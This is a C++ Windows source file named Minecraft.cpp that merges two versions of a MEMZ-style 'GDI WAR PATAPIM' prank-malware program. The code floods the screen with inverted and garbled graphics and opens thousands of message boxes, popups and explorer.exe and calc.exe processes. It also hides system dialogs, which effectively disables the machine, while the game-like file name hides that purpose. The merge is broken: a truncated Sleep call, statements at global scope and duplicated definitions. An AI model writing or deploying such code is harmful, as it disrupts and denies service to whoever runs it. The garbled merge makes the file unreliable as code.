// Minecraft.cpp
// Fusion chaotique de newfile.cpp et goto.cpp
// Conçu pour un chaos graphique maximal sans dépendance UNICODE

#define NOMINMAX
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <shellapi.h>
#include <string>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;

// == Début du code fusionné ==

// --- Contenu de goto.cpp ---
// GDI WAR PATAPIM.exe - Projet par TVKHALIL SAS // Tous les effets GDI sont utilisés pour un chaos graphique maximal

#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <time.h>
#include <stdlib.h>
#include <vector>
#include <string>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")

using namespace Gdiplus;

// Prototypes
DWORD WINAPI SoundThread(LPVOID);
DWORD WINAPI GDIThread(LPVOID);
DWORD WINAPI MsgBoxThread(LPVOID);
DWORD WINAPI ExplorerThread(LPVOID);
DWORD WINAPI CalcThread(LPVOID);
DWORD WINAPI SaleWinThread(LPVOID);
DWORD WINAPI IconFollowerThread(LPVOID);

// Globals
HBITMAP g_hBmp = NULL;
HWND g_hwndMain = NULL;
HINSTANCE g_hInstance = NULL;
CRITICAL_SECTION g_csIcons;
std::vector<HWND> g_iconWindows;
bool g_run = true;

///////////////////////
// Load PNG Resource //
HBITMAP LoadPNGResource()
{
    HRSRC hRes = FindResourceA(NULL, "PATAPIMPNG", RT_RCDATA);
    if (!hRes) return NULL;
    HGLOBAL hData = LoadResource(NULL, hRes);
    if (!hData) return NULL;
    void* pData = LockResource(hData);
    DWORD size = SizeofResource(NULL, hRes);

    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, size);
    void* pm = GlobalLock(hg);
    memcpy(pm, pData, size);
    GlobalUnlock(hg);
    IStream* ps = NULL;
    if (CreateStreamOnHGlobal(hg, TRUE, &ps) != S_OK) {
        GlobalFree(hg);
        return NULL;
    }
    Bitmap* b = Bitmap::FromStream(ps);
    HBITMAP hBmp = NULL;
    if (b && b->GetLastStatus() == Ok)
        b->GetHBITMAP(Color(0, 0, 0, 0), &hBmp);
    delete b;
    ps->Release();
    GlobalFree(hg);
    return hBmp;
}

///////////////////////
// Window Procedure  //
LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l)
{
    switch (m)
    {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        if (g_hBmp)
        {
            HDC mdc = CreateCompatibleDC(dc);
            HBITMAP o = (HBITMAP)SelectObject(mdc, g_hBmp);
            BITMAP bm;
            GetObject(g_hBmp, sizeof(bm), &bm);
            StretchBlt(dc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                mdc, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            SelectObject(mdc, o);
            DeleteDC(mdc);
        }
        EndPaint(h, &ps);
        return 0;
    }
    default:
        return DefWindowProcW(h, m, w, l);
    }
}

///////////////////////
// Sound Loop        //
void PlaySoundLoop()
{
    for (int i = 0; i < 100; ++i)
    {
        Beep(300 + rand() % 400, 100);
        MessageBeep(rand() % 5);
        Sleep(30);
    }
}

DWORD WINAPI SoundThread(LPVOID)
{
    PlaySoundLoop();
    return 0;
}

///////////////////////
// Chaos GDI Effect  //
void ChaosGDI()
{
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    // Create pen, brush, font
    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
    HFONT font = CreateFont(40, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH, L"Consolas");

    // Divide screen in 50 parts and invert colors
    int parts = 1000;
    int partW = w / parts;
    int partH = h / parts;

    for (int yPart = 0; yPart < parts; yPart++)
    {
        for (int xPart = 0; xPart < parts; xPart++)
        {
            RECT rc = { xPart * partW, yPart * partH, (xPart + 1) * partW, (yPart + 1) * partH };
            InvertRect(hdc, &rc);
        }
    }

    // Chaos drawing loop
    for (int i = 0; i < 1000; i++)
    {
        int x = rand() % w;
        int y = rand() % h;
        int rw = rand() % 400 + 10;
        int rh = rand() % 300 + 10;

        SelectObject(hdc, pen);
        SelectObject(hdc, brush);

        Rectangle(hdc, x, y, x + rw, y + rh);
        Ellipse(hdc, x, y, x + rw / 2, y + rh / 2);
        RoundRect(hdc, x, y, x + rw, y + rh, 20, 20);
        MoveToEx(hdc, x, y, NULL);
        LineTo(hdc, x + rw, y + rh);
        InvertRect(hdc, &RECT{ x, y, x + rw / 2, y + rh / 2 });
        SetROP2(hdc, R2_NOT);
        StretchBlt(hdc, x, y, rw, rh, hdc, x + 10, y + 10, rw, rh, SRCCOPY);
        PatBlt(hdc, x, y, rw / 2, rh / 2, PATINVERT);
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
        SetBkMode(hdc, TRANSPARENT);
        SelectObject(hdc, font);
        TextOut(hdc, x, y, L"brr brrr patapim", 18);
        Sleep(10);
    }

    DeleteObject(pen);
    DeleteObject(brush);
    DeleteObject(font);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI GDIThread(LPVOID)
{
    ChaosGDI();
    return 0;
}

///////////////////////
// MessageBox Spam   //
DWORD WINAPI MsgBoxThread(LPVOID)
{
    for (int i = 0; i < 1500 && g_run; i++)
    {
        MessageBoxW(NULL, L"brr brr patapim", L"brr brr patapim", MB_ICONERROR | MB_OK);
        Sleep(5);
    }
    return 0;
}

///////////////////////
// Explorer Spam     //
DWORD WINAPI ExplorerThread(LPVOID)
{
    for (int i = 0; i < 134523 && g_run; i++)
    {
        ShellExecuteW(NULL, L"open", L"explorer.exe", NULL, NULL, SW_SHOWDEFAULT);
        Sleep(1);
    }
    return 0;
}

///////////////////////
// Calculator Spam   //
DWORD WINAPI CalcThread(LPVOID)
{
    int opened = 0;
    while (g_run && opened < 13500)
    {
        ShellExecuteW(NULL, L"open", L"calc.exe", NULL, NULL, SW_SHOWDEFAULT);
        opened++;
        Sleep(5); // 10 par seconde
    }
    return 0;
}

///////////////////////
// SaleWin Mini Windows - style popup multiplication
void CreateSaleWinPopup()
{
    // Create a tiny window with some text, no border, always on top, random position

    int screenW = GetSystemMetrics(SM_CXSCREEN);
    int screenH = GetSystemMetrics(SM_CYSCREEN);

    int sizeW = 150;
    int sizeH = 50;

    int x = rand() % (screenW - sizeW);
    int y = rand() % (screenH - sizeH);

    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"SaleWinPopupClass",
        L"brr brr patapim",
        WS_POPUP | WS_VISIBLE,
        x, y, sizeW, sizeH,
        NULL, NULL, g_hInstance, NULL);

    if (hwnd)
    {
        SetWindowPos(hwnd, HWND_TOPMOST, x, y, sizeW, sizeH, SWP_SHOWWINDOW);
        UpdateWindow(hwnd);
        // Auto destroy after some time
        SetTimer(hwnd, 1, 500 + (rand() % 1500), NULL);
    }
}

LRESULT CALLBACK SaleWinPopupProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_TIMER:
        DestroyWindow(hWnd);
        break;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnd, &ps);
        RECT rc;
        GetClientRect(hWnd, &rc);
        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
        DrawTextW(hdc, L"brr brr patapim", -1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
        EndPaint(hWnd, &ps);
    }
    break;
    default:
        return DefWindowProcW(hWnd, message, wParam, lParam);
    }
    return 0;
}

DWORD WINAPI SaleWinThread(LPVOID)
{
    // Register class for mini windows
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = SaleWinPopupProc;
    wc.hInstance = g_hInstance;
    wc.lpszClassName = L"SaleWinPopupClass";
    RegisterClassW(&wc);

    // Spawn a lot of mini popup windows, 2000 for example
    for (int i = 0; i < 5000 && g_run; i++)
    {
        CreateSaleWinPopup();
        Sleep(15); // vitesse d'apparition
    }

    // Keep thread alive while windows are open
    Sleep(
    
    // ... suite du SaleWinThread

    // Keep thread alive while windows are open
    while (g_run)
    {
        Sleep(50);
    }
    return 0;
}

HDC hdcScreen = GetDC(NULL);                 // Contexte écran
HDC hdcMem = CreateCompatibleDC(hdcScreen); // DC mémoire compatible

int width = GetSystemMetrics(SM_CXSCREEN);
int height = GetSystemMetrics(SM_CYSCREEN);

HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
SelectObject(hdcMem, hBitmap);

// Capture l'écran dans le bitmap
BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

// Parcours pixel par pixel pour modifier les couleurs (ex: effet de négatif)
BITMAPINFO bmi = {0};
bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
bmi.bmiHeader.biWidth = width;
bmi.bmiHeader.biHeight = -height; // top-down
bmi.bmiHeader.biPlanes = 1;
bmi.bmiHeader.biBitCount = 32;
bmi.bmiHeader.biCompression = BI_RGB;

BYTE* pPixels = nullptr;
GetDIBits(hdcMem, hBitmap, 0, height, NULL, &bmi, DIB_RGB_COLORS);
pPixels = new BYTE[width * height * 4];
GetDIBits(hdcMem, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);

for (int i = 0; i < width * height * 4; i += 4) {
    pPixels[i] = 255 - pPixels[i];       // B
    pPixels[i + 1] = 255 - pPixels[i + 1]; // G
    pPixels[i + 2] = 255 - pPixels[i + 2]; // R
}

// Met à jour le bitmap avec les pixels modifiés
SetDIBits(hdcMem, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);

// Affiche le bitmap modifié sur l'écran
BitBlt(hdcScreen, 0, 0, width, height, hdcMem, 0, 0, SRCCOPY);

delete[] pPixels;
DeleteObject(hBitmap);
DeleteDC(hdcMem);
ReleaseDC(NULL, hdcScreen);///////////////////////
// Icon follower windows "?" et "X" qui suivent la souris

const int MAX_ICONS = 150000;

LRESULT CALLBACK IconWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    switch (msg)
    {
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hwnd, &ps);
        RECT rc;
        GetClientRect(hwnd, &rc);

        SetBkMode(hdc, TRANSPARENT);
        SetTextColor(hdc, RGB(0, 255, 0)); // vert hacker

        wchar_t iconChar = L'?';
        if (rand() % 2 == 0) iconChar = L'X';

        HFONT font = CreateFont(24, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE,
            ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_PITCH, L"Consolas");
        HFONT oldFont = (HFONT)SelectObject(hdc, font);

        DrawTextW(hdc, &iconChar, 1, &rc, DT_CENTER | DT_VCENTER | DT_SINGLELINE);

        SelectObject(hdc, oldFont);
        DeleteObject(font);

        EndPaint(hwnd, &ps);
        return 0;
    }
    case WM_NCHITTEST:
        return HTTRANSPARENT; // clic passe à la fenêtre en dessous
    case WM_DESTROY:
        EnterCriticalSection(&g_csIcons);
        g_iconWindows.erase(std::remove(g_iconWindows.begin(), g_iconWindows.end(), hwnd), g_iconWindows.end());
        LeaveCriticalSection(&g_csIcons);
        break;
    default:
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void CreateIconWindow(int x, int y)
{
    HWND hwnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_LAYERED | WS_EX_TOOLWINDOW,
        L"IconClass",
        NULL,
        WS_POPUP,
        x, y, 30, 30,
        NULL, NULL, g_hInstance, NULL);

    if (hwnd)
    {
        SetLayeredWindowAttributes(hwnd, 0, 200, LWA_ALPHA);
        ShowWindow(hwnd, SW_SHOW);

        EnterCriticalSection(&g_csIcons);
        g_iconWindows.push_back(hwnd);
        if ((int)g_iconWindows.size() > MAX_ICONS)
        {
            HWND old = g_iconWindows.front();
            g_iconWindows.erase(g_iconWindows.begin());
            DestroyWindow(old);
        }
        LeaveCriticalSection(&g_csIcons);
    }
}

DWORD WINAPI IconFollowerThread(LPVOID)
{
    // Register class for icons
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = IconWndProc;
    wc.hInstance = g_hInstance;
    wc.lpszClassName = L"IconClass";
    RegisterClassW(&wc);

    POINT lastPos = { 0 };
    while (g_run)
    {
        POINT pt;
        GetCursorPos(&pt);
        if (pt.x != lastPos.x || pt.y != lastPos.y)
        {
            int count = 5 + rand() % 10; // plusieurs icônes à chaque mouvement
            for (int i = 0; i < count; i++)
            {
                int rx = pt.x + (rand() % 100) - 50;
                int ry = pt.y + (rand() % 100) - 50;
                CreateIconWindow(rx, ry);
            }
            lastPos = pt;
        }
        Sleep(20);
    }

    // Cleanup all icon windows
    EnterCriticalSection(&g_csIcons);
    for (HWND h : g_iconWindows)
        DestroyWindow(h);
    g_iconWindows.clear();
    LeaveCriticalSection(&g_csIcons);

    return 0;
}

///////////////////////

// Main WinMain //
int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE, PWSTR, int)
{
    g_hInstance = hInstance;
    InitializeCriticalSection(&g_csIcons);
    srand((unsigned int)time(NULL));

    // Load patapim.png in resource (doit être lié dans le .rc)
    g_hBmp = LoadPNGResource();

    // Register main window class
    WNDCLASSW wc = { 0 };
    wc.lpfnWndProc = WndProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"MainPatapimClass";
    RegisterClassW(&wc);

    g_hwndMain = CreateWindowExW(0, wc.lpszClassName, L"Patapim.exe", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    ShowWindow(g_hwndMain, SW_SHOWMAXIMIZED);
    UpdateWindow(g_hwndMain);

    // Threads pour tous les effets
    CreateThread(NULL, 0, SoundThread, NULL, 0, NULL);
    CreateThread(NULL, 0, GDIThread, NULL, 0, NULL);
    CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL);
    CreateThread(NULL, 0, ExplorerThread, NULL, 0, NULL);
    CreateThread(NULL, 0, CalcThread, NULL, 0, NULL);
    CreateThread(NULL, 0, SaleWinThread, NULL, 0, NULL);
    CreateThread(NULL, 0, IconFollowerThread, NULL, 0, NULL);

    // Boucle messages classique
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    g_run = false;

    DeleteCriticalSection(&g_csIcons);
    if (g_hBmp) DeleteObject(g_hBmp);

    return 0;
}

// --- Contenu de newfile.cpp ---
//DRAX

#define NOMINMAX
#define _WIN32_WINNT 0x0601

#include <windows.h>
#include <gdiplus.h>
#include <mmsystem.h>
#include <cstdlib>
#include <ctime>
#include <vector>
#include <shellapi.h>

#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "shell32.lib")

using namespace Gdiplus;

// Déclarations
DWORD WINAPI SoundThread(LPVOID);
DWORD WINAPI GDIThread(LPVOID);
DWORD WINAPI MsgBoxThread(LPVOID);
DWORD WINAPI ExplorerThread(LPVOID);
DWORD WINAPI CalcThread(LPVOID);
DWORD WINAPI SaleWinThread(LPVOID);
DWORD WINAPI IconFollowerThread(LPVOID);
DWORD WINAPI MEMZ_GDI_Thread(LPVOID);
DWORD WINAPI Open300WindowsThread(LPVOID);
void NegativeEffect();

// Globals
HBITMAP g_hBmp = NULL;
HWND g_hwndMain = NULL;
HINSTANCE g_hInstance = NULL;
CRITICAL_SECTION g_csIcons;
std::vector<HWND> g_iconWindows;
bool g_run = true;

// Charge un PNG intégré en tant que ressource
HBITMAP LoadPNGResource() {
    HRSRC hRes = FindResourceA(g_hInstance, "PATAPIMPNG", RT_RCDATA);
    if (!hRes) return NULL;

    HGLOBAL hData = LoadResource(g_hInstance, hRes);
    if (!hData) return NULL;

    void* pData = LockResource(hData);
    DWORD size = SizeofResource(g_hInstance, hRes);
    if (!pData || size == 0) return NULL;

    HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, size);
    if (!hg) return NULL;

    void* pm = GlobalLock(hg);
    if (!pm) {
        GlobalFree(hg);
        return NULL;
    }
    memcpy(pm, pData, size);
    GlobalUnlock(hg);

    IStream* ps = NULL;
    if (CreateStreamOnHGlobal(hg, TRUE, &ps) != S_OK) {
        GlobalFree(hg);
        return NULL;
    }

    Bitmap* b = Bitmap::FromStream(ps);
    HBITMAP hBmp = NULL;
    if (b && b->GetLastStatus() == Ok)
        b->GetHBITMAP(Color(0, 0, 0, 0), &hBmp);

    delete b;
    ps->Release();
    return hBmp;
}

// Fenêtre principale
LRESULT CALLBACK WndProc(HWND h, UINT m, WPARAM w, LPARAM l) {
    switch (m) {
    case WM_DESTROY:
        PostQuitMessage(0);
        return 0;
    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC dc = BeginPaint(h, &ps);
        if (g_hBmp) {
            HDC mdc = CreateCompatibleDC(dc);
            HBITMAP o = (HBITMAP)SelectObject(mdc, g_hBmp);
            BITMAP bm;
            GetObject(g_hBmp, sizeof(bm), &bm);
            StretchBlt(dc, 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
                mdc, 0, 0, bm.bmWidth, bm.bmHeight, SRCCOPY);
            SelectObject(mdc, o);
            DeleteDC(mdc);
        }
        EndPaint(h, &ps);
        return 0;
    }
    default:
        return DefWindowProcA(h, m, w, l);
    }
}

// Threads individuels

DWORD WINAPI SoundThread(LPVOID) {
    PlaySoundA("musik.wav", NULL, SND_FILENAME | SND_ASYNC | SND_LOOP);
    while (g_run) Sleep(1000);
    PlaySoundA(NULL, NULL, 0);
    return 0;
}

void ChaosGDI() {
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN);
    int h = GetSystemMetrics(SM_CYSCREEN);

    HPEN pen = CreatePen(PS_SOLID, 2, RGB(rand() % 256, rand() % 256, rand() % 256));
    HBRUSH brush = CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256));
    HFONT font = CreateFontA(40, 0, 0, 0, FW_BOLD, TRUE, FALSE, FALSE,
        ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
        DEFAULT_QUALITY, DEFAULT_PITCH, "Consolas");

    int parts = 50;
    int partW = w / parts;
    int partH = h / parts;

    for (int y = 0; y < parts; y++)
        for (int x = 0; x < parts; x++) {
            RECT rc = { x * partW, y * partH, (x + 1) * partW, (y + 1) * partH };
            InvertRect(hdc, &rc);
        }

    for (int i = 0; i < 1000; i++) {
        int x = rand() % w;
        int y = rand() % h;
        int rw = rand() % 400 + 10;
        int rh = rand() % 300 + 10;

        SelectObject(hdc, pen);
        SelectObject(hdc, brush);

        Rectangle(hdc, x, y, x + rw, y + rh);
        Ellipse(hdc, x, y, x + rw / 2, y + rh / 2);
        RoundRect(hdc, x, y, x + rw, y + rh, 20, 20);
        MoveToEx(hdc, x, y, NULL);
        LineTo(hdc, x + rw, y + rh);

        RECT r = { x, y, x + rw / 2, y + rh / 2 };
        InvertRect(hdc, &r);

        SetROP2(hdc, R2_NOT);
        StretchBlt(hdc, x, y, rw, rh, hdc, x + 10, y + 10, rw, rh, SRCCOPY);
        PatBlt(hdc, x, y, rw / 2, rh / 2, PATINVERT);
        SetTextColor(hdc, RGB(rand() % 256, rand() % 256, rand() % 256));
        SetBkMode(hdc, TRANSPARENT);
        SelectObject(hdc, font);
        TextOutA(hdc, x, y, "brr brrr patapim", 17);
        Sleep(10);
    }

    DeleteObject(pen);
    DeleteObject(brush);
    DeleteObject(font);
    ReleaseDC(NULL, hdc);
}

DWORD WINAPI GDIThread(LPVOID) {
    ChaosGDI();
    NegativeEffect();
    return 0;
}

void NegativeEffect() {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HDC hdcScreen = GetDC(NULL);
    HDC hdcMem = CreateCompatibleDC(hdcScreen);
    HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, width, height);
    HBITMAP hOldBmp = (HBITMAP)SelectObject(hdcMem, hBitmap);
    BitBlt(hdcMem, 0, 0, width, height, hdcScreen, 0, 0, SRCCOPY);

    BITMAPINFO bmi = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = width;
    bmi.bmiHeader.biHeight = -height;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;

    BYTE* pPixels = new BYTE[width * height * 4];
    if (pPixels) {
        GetDIBits(hdcMem, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);

        for (int i = 0; i < width * height * 4; i += 4) {
            pPixels[i] = 255 - pPixels[i];
            pPixels[i + 1] = 255 - pPixels[i + 1];
            pPixels[i + 2] = 255 - pPixels[i + 2];
        }

        SetDIBits(hdcMem, hBitmap, 0, height, pPixels, &bmi, DIB_RGB_COLORS);
        BitBlt(hdcScreen, 0, 0, width, height, hdcMem, 0, 0, SRCCOPY);
        delete[] pPixels;
    }

    SelectObject(hdcMem, hOldBmp);
    DeleteObject(hBitmap);
    DeleteDC(hdcMem);
    ReleaseDC(NULL, hdcScreen);
}

DWORD WINAPI MsgBoxThread(LPVOID) {
    for (int i = 0; i < 1500 && g_run; i++) {
        MessageBoxA(NULL, "PATAPIM !! PATAPIM !!", "PATAPIM", MB_OK | MB_ICONINFORMATION);
        Sleep(10);
    }
    return 0;
}

DWORD WINAPI ExplorerThread(LPVOID) {
    for (int i = 0; i < 1000 && g_run; i++) {
        ShellExecuteA(NULL, "open", "explorer.exe", NULL, NULL, SW_SHOW);
        Sleep(20);
    }
    return 0;
}

DWORD WINAPI CalcThread(LPVOID) {
    for (int i = 0; i < 1000 && g_run; i++) {
        ShellExecuteA(NULL, "open", "calc.exe", NULL, NULL, SW_SHOW);
        Sleep(20);
    }
    return 0;
}

DWORD WINAPI SaleWinThread(LPVOID) {
    for (int i = 0; i < 1500 && g_run; i++) {
        HWND hwnd = FindWindowA("#32770", NULL);
        if (hwnd)
            ShowWindow(hwnd, SW_HIDE);
        Sleep(50);
    }
    return 0;
}

DWORD WINAPI IconFollowerThread(LPVOID) {
    while (g_run) {
        POINT pt;
        GetCursorPos(&pt);
        HWND hwnd = CreateWindowExA(WS_EX_TOOLWINDOW | WS_EX_TOPMOST,
            "STATIC", NULL, WS_VISIBLE | WS_POPUP,
            pt.x, pt.y, 32, 32, NULL, NULL, g_hInstance, NULL);

        HICON hIcon = LoadIcon(NULL, IDI_INFORMATION);
        SendMessageA(hwnd, STM_SETICON, (WPARAM)hIcon, 0);

        EnterCriticalSection(&g_csIcons);
        g_iconWindows.push_back(hwnd);
        LeaveCriticalSection(&g_csIcons);

        Sleep(50);
        DestroyWindow(hwnd);
    }
    return 0;
}

DWORD WINAPI MEMZ_GDI_Thread(LPVOID) {
    HDC hdc = GetDC(NULL);
    while (g_run) {
        BitBlt(hdc, rand() % GetSystemMetrics(SM_CXSCREEN),
            rand() % GetSystemMetrics(SM_CYSCREEN),
            rand() % 800, rand() % 600,
            hdc, rand() % GetSystemMetrics(SM_CXSCREEN),
            rand() % GetSystemMetrics(SM_CYSCREEN),
            SRCCOPY);
        Sleep(50);
    }
    ReleaseDC(NULL, hdc);
    return 0;
}

DWORD WINAPI Open300WindowsThread(LPVOID) {
    for (int i = 0; i < 300 && g_run; i++) {
        CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL);
        Sleep(20);
    }
    return 0;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nCmdShow) {
    g_hInstance = hInstance;
    srand((unsigned int)time(NULL));
    InitializeCriticalSection(&g_csIcons);

    GdiplusStartupInput gdiInput;
    ULONG_PTR gdiToken;
    GdiplusStartup(&gdiToken, &gdiInput, NULL);

    WNDCLASSEXA wcex = { sizeof(wcex) };
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.hInstance = hInstance;
    wcex.lpszClassName = "PatapimWindowClass";
    wcex.hCursor = LoadCursor(NULL, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);

    RegisterClassExA(&wcex);

    g_hwndMain = CreateWindowExA(WS_EX_TOPMOST | WS_EX_LAYERED, wcex.lpszClassName,
        "Patapim", WS_POPUP,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, hInstance, NULL);

    if (!g_hwndMain)
        return -1;

    g_hBmp = LoadPNGResource();
    SetLayeredWindowAttributes(g_hwndMain, 0, 255, LWA_ALPHA);
    ShowWindow(g_hwndMain, nCmdShow);
    UpdateWindow(g_hwndMain);

    HANDLE hThreads[] = {
        CreateThread(NULL, 0, SoundThread, NULL, 0, NULL),
        CreateThread(NULL, 0, GDIThread, NULL, 0, NULL),
        CreateThread(NULL, 0, MsgBoxThread, NULL, 0, NULL),
        CreateThread(NULL, 0, ExplorerThread, NULL, 0, NULL),
        CreateThread(NULL, 0, CalcThread, NULL, 0, NULL),
        CreateThread(NULL, 0, SaleWinThread, NULL, 0, NULL),
        CreateThread(NULL, 0, IconFollowerThread, NULL, 0, NULL),
        CreateThread(NULL, 0, MEMZ_GDI_Thread, NULL, 0, NULL),
        CreateThread(NULL, 0, Open300WindowsThread, NULL, 0, NULL)
    };

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    g_run = false;
    WaitForMultipleObjects(9, hThreads, TRUE, INFINITE);
    for (int i = 0; i < 9; i++) CloseHandle(hThreads[i]);

    if (g_hBmp) DeleteObject(g_hBmp);
    DeleteCriticalSection(&g_csIcons);
    GdiplusShutdown(gdiToken);

    return 0;
}

// == Fin du code fusionné ==
